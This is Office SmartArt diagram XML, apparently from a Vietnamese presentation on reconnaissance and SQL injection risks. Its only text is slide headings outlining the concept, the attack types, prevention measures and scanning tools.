    <dgm:cxn modelId="{30227769-12B7-430A-A986-4CEE2CA6919F}" type="presParOf" srcId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" destId="{E2024A96-81D4-4B42-8F9A-E8788F0E2983}" srcOrd="7" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{D3181125-D5D0-44AE-A17C-86ED5C52EEB2}" type="presParOf" srcId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" destId="{CB24E6A2-65E1-484D-8EAB-957FA34D9D52}" srcOrd="8" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{A0A0261C-E627-433F-9D04-8F1748922E5D}" type="presParOf" srcId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" destId="{72184EE1-38F9-46D5-85AA-D86F10808435}" srcOrd="9" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{BA7B08E3-8093-45E8-8164-9A5882EEE42C}" type="presParOf" srcId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" destId="{653860F1-62AE-4078-9CFE-2AC7E54C19CC}" srcOrd="10" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{41AD2D01-9A62-4EC9-91B9-0CC8EDD18CD8}" type="presParOf" srcId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" destId="{567585C6-6C13-428A-B488-77D81AFE3779}" srcOrd="11"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94D8596-48D0-486B-8783-2ADF0883213C}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2005/8/layout/list1" loCatId="list" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple1" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/accent2_1" csCatId="accent2" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}">
      <dgm:prSet custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr algn="ctr">
            <a:buAutoNum type="arabicPeriod"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="3500" b="1"/>
            <a:t>1. Nguy cơ tấn công do thám</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9EC7B965-5D54-470D-B689-C0BA2FABFCA1}" type="parTrans" cxnId="{90402C88-81A9-4F97-9826-AB2628608667}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B6D24611-8D24-4857-ACF5-3F6B886E8F6D}" type="sibTrans" cxnId="{90402C88-81A9-4F97-9826-AB2628608667}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" type="pres">
      <dgm:prSet presAssocID="{D94D8596-48D0-486B-8783-2ADF0883213C}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{24BDE9BE-48E6-405E-8AF0-A28B29ED8C66}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="1"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CE841021-028B-435A-A662-9D12B985022C}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="parentText" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="1" custScaleX="96200">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A3476D70-817C-46D0-A1BE-6AE9D5D978FD}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7D76A578-B55C-43EC-B2A0-551426FD04BF}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="1">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{9220FA34-72C9-4A40-B520-9C639D661416}" type="presOf" srcId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" destId="{24BDE9BE-48E6-405E-8AF0-A28B29ED8C66}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E080B942-606C-4280-A576-C4F1448F092F}" type="presOf" srcId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" destId="{CE841021-028B-435A-A662-9D12B985022C}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{90402C88-81A9-4F97-9826-AB2628608667}" srcId="{D94D8596-48D0-486B-8783-2ADF0883213C}" destId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" srcOrd="0" destOrd="0" parTransId="{9EC7B965-5D54-470D-B689-C0BA2FABFCA1}" sibTransId="{B6D24611-8D24-4857-ACF5-3F6B886E8F6D}"/>
    <dgm:cxn modelId="{F98357D8-9078-49C5-8F20-FEA8AF459132}" type="presOf" srcId="{D94D8596-48D0-486B-8783-2ADF0883213C}" destId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{2B0CEF6D-61B2-446A-AE80-1DED1E50C91C}" type="presParOf" srcId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" destId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{AD6D83A4-3178-4B60-856A-BE2D20A0D6C9}" type="presParOf" srcId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" destId="{24BDE9BE-48E6-405E-8AF0-A28B29ED8C66}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6953A462-9333-489C-A223-91E26F5C801E}" type="presParOf" srcId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" destId="{CE841021-028B-435A-A662-9D12B985022C}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A349FC73-76E5-4A89-A6AF-64B0FF8CE1AF}" type="presParOf" srcId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" destId="{A3476D70-817C-46D0-A1BE-6AE9D5D978FD}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8CA1C34B-36F5-4703-BC69-D5D8D6471459}" type="presParOf" srcId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" destId="{7D76A578-B55C-43EC-B2A0-551426FD04BF}"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94D8596-48D0-486B-8783-2ADF0883213C}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2005/8/layout/list1" loCatId="list" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple1" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/accent2_1" csCatId="accent2" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}">
      <dgm:prSet custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr algn="ctr">
            <a:buAutoNum type="arabicPeriod"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="3500" b="1"/>
            <a:t>2. Nguy cơ tấn công </a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr algn="ctr">
            <a:buAutoNum type="arabicPeriod"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="3500" b="1"/>
            <a:t>SQL Injection</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9EC7B965-5D54-470D-B689-C0BA2FABFCA1}" type="parTrans" cxnId="{90402C88-81A9-4F97-9826-AB2628608667}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B6D24611-8D24-4857-ACF5-3F6B886E8F6D}" type="sibTrans" cxnId="{90402C88-81A9-4F97-9826-AB2628608667}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" type="pres">
      <dgm:prSet presAssocID="{D94D8596-48D0-486B-8783-2ADF0883213C}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{24BDE9BE-48E6-405E-8AF0-A28B29ED8C66}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="1"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CE841021-028B-435A-A662-9D12B985022C}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="parentText" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="1" custScaleX="96200">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A3476D70-817C-46D0-A1BE-6AE9D5D978FD}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7D76A578-B55C-43EC-B2A0-551426FD04BF}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="1">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{9220FA34-72C9-4A40-B520-9C639D661416}" type="presOf" srcId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" destId="{24BDE9BE-48E6-405E-8AF0-A28B29ED8C66}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E080B942-606C-4280-A576-C4F1448F092F}" type="presOf" srcId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" destId="{CE841021-028B-435A-A662-9D12B985022C}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{90402C88-81A9-4F97-9826-AB2628608667}" srcId="{D94D8596-48D0-486B-8783-2ADF0883213C}" destId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" srcOrd="0" destOrd="0" parTransId="{9EC7B965-5D54-470D-B689-C0BA2FABFCA1}" sibTransId="{B6D24611-8D24-4857-ACF5-3F6B886E8F6D}"/>
    <dgm:cxn modelId="{F98357D8-9078-49C5-8F20-FEA8AF459132}" type="presOf" srcId="{D94D8596-48D0-486B-8783-2ADF0883213C}" destId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{2B0CEF6D-61B2-446A-AE80-1DED1E50C91C}" type="presParOf" srcId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" destId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{AD6D83A4-3178-4B60-856A-BE2D20A0D6C9}" type="presParOf" srcId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" destId="{24BDE9BE-48E6-405E-8AF0-A28B29ED8C66}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6953A462-9333-489C-A223-91E26F5C801E}" type="presParOf" srcId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" destId="{CE841021-028B-435A-A662-9D12B985022C}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A349FC73-76E5-4A89-A6AF-64B0FF8CE1AF}" type="presParOf" srcId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" destId="{A3476D70-817C-46D0-A1BE-6AE9D5D978FD}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8CA1C34B-36F5-4703-BC69-D5D8D6471459}" type="presParOf" srcId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" destId="{7D76A578-B55C-43EC-B2A0-551426FD04BF}"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064C300-B287-47B4-BA96-CC29F101EF59}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess" loCatId="process" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple1" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/colorful1" csCatId="colorful" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{02FC16F2-001A-4983-8414-5FED92A5A82B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr rtl="0"/>
          <a:r>
            <a:rPr lang="en-US"/>
            <a:t>Khái niệm</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{90B41A83-6E6D-40CC-A24A-9D218E53CBD9}" type="parTrans" cxnId="{0A615020-2734-4C8E-9389-16915B6D9508}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B53B7C97-2481-4538-AF92-3A4BFBF83BBC}" type="sibTrans" cxnId="{0A615020-2734-4C8E-9389-16915B6D9508}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{00FB48F0-CE3D-4011-B6A3-BA60DC4CED09}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr rtl="0"/>
          <a:r>
            <a:rPr lang="en-US"/>
            <a:t>Các dạng tấn công SQL Injection</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A0F5B01D-9B28-4CFF-9F32-FD5C1636596A}" type="parTrans" cxnId="{3ADD6F26-92E2-43EA-B378-9DA48D938D7B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FABA640C-1B94-47C3-8214-AB150FA01EE7}" type="sibTrans" cxnId="{3ADD6F26-92E2-43EA-B378-9DA48D938D7B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AACB945A-C79F-4AFC-A37F-878F31F9BD06}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr rtl="0"/>
          <a:r>
            <a:rPr lang="en-US"/>
            <a:t>Các biện pháp phòng chống tấn công SQL Injection</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F057E2D6-9F9D-4A94-9E0C-BB71FBD6A32B}" type="parTrans" cxnId="{F737735B-CAC6-48C6-B39C-ABB50C11BC27}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BC705829-E1EA-4F37-AB19-D85379C9CBD7}" type="sibTrans" cxnId="{F737735B-CAC6-48C6-B39C-ABB50C11BC27}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4270620F-10CA-4064-A21E-7BB1B894189A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr rtl="0"/>
          <a:r>
            <a:rPr lang="en-US"/>
            <a:t>Giới thiệu một số công cụ quét lỗ hổng SQL Injection</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{62B04C73-AA96-430B-8468-6500CB186A82}" type="parTrans" cxnId="{3AF2C000-F7C4-4C00-891C-1A5EDE72F28D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7A0E39E3-7511-404D-B3FE-0E2E759DEED9}" type="sibTrans" cxnId="{3AF2C000-F7C4-4C00-891C-1A5EDE72F28D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{79E4D48D-74D4-493C-BA36-2E5076C41D0C}" type="pres">
      <dgm:prSet presAssocID="{D064C300-B287-47B4-BA96-CC29F101EF59}" presName="rootnode" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:chMax/>
          <dgm:chPref/>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B86C2532-0AC6-48CA-8AC9-5DD11DC25520}" type="pres">
      <dgm:prSet presAssocID="{02FC16F2-001A-4983-8414-5FED92A5A82B}" presName="composite" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D1EE4A30-9CCE-4815-8485-5E055953A693}" type="pres">
      <dgm:prSet presAssocID="{02FC16F2-001A-4983-8414-5FED92A5A82B}" presName="LShape" presStyleLbl="alignNode1" presStyleIdx="0" presStyleCnt="7"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{613F1B29-2607-4C75-8994-AA653EF6A94B}" type="pres">
      <dgm:prSet presAssocID="{02FC16F2-001A-4983-8414-5FED92A5A82B}" presName="ParentText" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1D436C71-0B33-4691-BE6C-76BB5D3AA3BF}" type="pres">
      <dgm:prSet presAssocID="{02FC16F2-001A-4983-8414-5FED92A5A82B}" presName="Triangle" presStyleLbl="alignNode1" presStyleIdx="1" presStyleCnt="7"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1B4DBC93-C189-4B93-9ABF-24AF20444849}" type="pres">
      <dgm:prSet presAssocID="{B53B7C97-2481-4538-AF92-3A4BFBF83BBC}" presName="sibTrans" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{360E57D7-BD14-4971-9459-BF894B64A716}" type="pres">
      <dgm:prSet presAssocID="{B53B7C97-2481-4538-AF92-3A4BFBF83BBC}" presName="space" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{42A2C4CD-4165-45E3-B10E-627C355D3BEB}" type="pres">
      <dgm:prSet presAssocID="{00FB48F0-CE3D-4011-B6A3-BA60DC4CED09}" presName="composite" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{98A38C6B-B26C-4D98-81DE-A52B509FF70F}" type="pres">
      <dgm:prSet presAssocID="{00FB48F0-CE3D-4011-B6A3-BA60DC4CED09}" presName="LShape" presStyleLbl="alignNode1" presStyleIdx="2" presStyleCnt="7"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{833E858F-C498-45F8-B957-4322301E8F16}" type="pres">
      <dgm:prSet presAssocID="{00FB48F0-CE3D-4011-B6A3-BA60DC4CED09}" presName="ParentText" presStyleLbl="revTx" presStyleIdx="1" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{AB6E4892-296E-419F-B1CD-CAFE60847FC3}" type="pres">
      <dgm:prSet presAssocID="{00FB48F0-CE3D-4011-B6A3-BA60DC4CED09}" presName="Triangle" presStyleLbl="alignNode1" presStyleIdx="3" presStyleCnt="7"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{54CA2D53-F193-478E-846A-B4EFDC0E8DA0}" type="pres">
      <dgm:prSet presAssocID="{FABA640C-1B94-47C3-8214-AB150FA01EE7}" presName="sibTrans" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A144F348-CB82-47B3-A7FB-F5801DAAEA12}" type="pres">
      <dgm:prSet presAssocID="{FABA640C-1B94-47C3-8214-AB150FA01EE7}" presName="space" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{9A38C0AF-87AD-4DA2-88AE-2D92235484C2}" type="pres">
      <dgm:prSet presAssocID="{AACB945A-C79F-4AFC-A37F-878F31F9BD06}" presName="composite" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{13221F77-E1DF-45C9-ACE5-B4735A822FFD}" type="pres">
      <dgm:prSet presAssocID="{AACB945A-C79F-4AFC-A37F-878F31F9BD06}" presName="LShape" presStyleLbl="alignNode1" presStyleIdx="4" presStyleCnt="7"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{430CAFAF-EE92-4E60-998B-E4156AA5C7B4}" type="pres">
      <dgm:prSet presAssocID="{AACB945A-C79F-4AFC-A37F-878F31F9BD06}" presName="ParentText" presStyleLbl="revTx" presStyleIdx="2" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{34E767A6-DAE0-445C-B2D3-B28EABE1A0F6}" type="pres">
      <dgm:prSet presAssocID="{AACB945A-C79F-4AFC-A37F-878F31F9BD06}" presName="Triangle" presStyleLbl="alignNode1" presStyleIdx="5" presStyleCnt="7"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E0142E3B-755D-4D89-B7CA-8081ECC9C2D8}" type="pres">
      <dgm:prSet presAssocID="{BC705829-E1EA-4F37-AB19-D85379C9CBD7}" presName="sibTrans" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E4E406F8-8DB7-469B-B68B-BA5CA05B2772}" type="pres">
      <dgm:prSet presAssocID="{BC705829-E1EA-4F37-AB19-D85379C9CBD7}" presName="space" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{2F371C9D-EA4E-47D0-9598-54AF0C9F60D5}" type="pres">
      <dgm:prSet presAssocID="{4270620F-10CA-4064-A21E-7BB1B894189A}" presName="composite" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7405AA7C-5713-4D74-8F26-92568F109EA9}" type="pres">
      <dgm:prSet presAssocID="{4270620F-10CA-4064-A21E-7BB1B894189A}" presName="LShape" presStyleLbl="alignNode1" presStyleIdx="6" presStyleCnt="7"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{81D70254-BEED-4521-9FA1-36AAD3C7D81A}" type="pres">
      <dgm:prSet presAssocID="{4270620F-10CA-4064-A21E-7BB1B894189A}" presName="ParentText" presStyleLbl="revTx" presStyleIdx="3" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{3AF2C000-F7C4-4C00-891C-1A5EDE72F28D}" srcId="{D064C300-B287-47B4-BA96-CC29F101EF59}" destId="{4270620F-10CA-4064-A21E-7BB1B894189A}" srcOrd="3" destOrd="0" parTransId="{62B04C73-AA96-430B-8468-6500CB186A82}" sibTransId="{7A0E39E3-7511-404D-B3FE-0E2E759DEED9}"/>
    <dgm:cxn modelId="{51A9F507-B682-4AFE-AB40-8AB63CB0F98C}" type="presOf" srcId="{00FB48F0-CE3D-4011-B6A3-BA60DC4CED09}" destId="{833E858F-C498-45F8-B957-4322301E8F16}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
    <dgm:cxn modelId="{43302414-D363-47D0-AA61-61A0627DE1E9}" type="presOf" srcId="{D064C300-B287-47B4-BA96-CC29F101EF59}" destId="{79E4D48D-74D4-493C-BA36-2E5076C41D0C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2009/3/layout/StepUpProcess"/>
